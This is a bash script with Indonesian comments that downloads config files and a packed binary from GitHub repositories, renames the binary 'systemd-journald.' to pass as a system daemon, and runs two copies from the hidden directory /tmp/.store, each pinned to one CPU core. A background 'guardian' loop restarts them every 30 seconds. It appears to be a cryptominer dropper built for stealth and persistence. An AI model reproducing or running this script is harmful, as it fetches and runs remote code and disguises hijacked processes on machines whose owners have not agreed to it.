#!/bin/bash

# Warna untuk gaya manja
GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Menyiapkan environment...${NC}"

# Buat folder kerja
mkdir -p /tmp/.store/1 /tmp/.store/2

# Download konfigurasi pertama
cd /tmp/.store/1
wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/1.ini -O config.ini

# Download konfigurasi kedua
cd /tmp/.store/2
wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/2.ini -O config.ini

# Balik ke folder utama
cd /tmp/.store

# Download dan ekstrak file utama
wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz
tar -xzf cache.tar.gz
rm -f cache.tar.gz
mv cache systemd-journald.

# Copy file utama ke masing-masing folder
cp systemd-journald. /tmp/.store/1/
cp systemd-journald. /tmp/.store/2/
chmod +x /tmp/.store/1/systemd-journald.
chmod +x /tmp/.store/2/systemd-journald.

# Bersih-bersih
rm -f systemd-journald.

# Bikin guardian.sh buat ngawasin proses
cat > /tmp/.store/guardian.sh << 'EOF'
#!/bin/bash

while true
do
    # Cek proses pertama
    if ! ps -C systemd-journald. -o cmd= | grep -q "/tmp/.store/1/systemd-journald."
    then
        echo "[!] Proses pertama tidak ditemukan... Menyalakan ulang."
        cd /tmp/.store/1 && nohup taskset -c 0 ./systemd-journald. > /dev/null 2>&1 &
    fi

    # Cek proses kedua
    if ! ps -C systemd-journald. -o cmd= | grep -q "/tmp/.store/2/systemd-journald."
    then
        echo "[!] Proses kedua tidak ditemukan... Menyalakan ulang."
        cd /tmp/.store/2 && nohup taskset -c 1 ./systemd-journald. > /dev/null 2>&1 &
    fi

    sleep 30
done
EOF

chmod +x /tmp/.store/guardian.sh

echo -e "${GREEN}[*] Menyalakan background service...${NC}"

# Start guardian saja
nohup bash /tmp/.store/guardian.sh > /dev/null 2>&1 &

echo -e "${GREEN}[✓] Semuanya sudah diawasi guardian.${NC}"

# Cek status
ps aux | grep systemd-journald. | grep -v grep
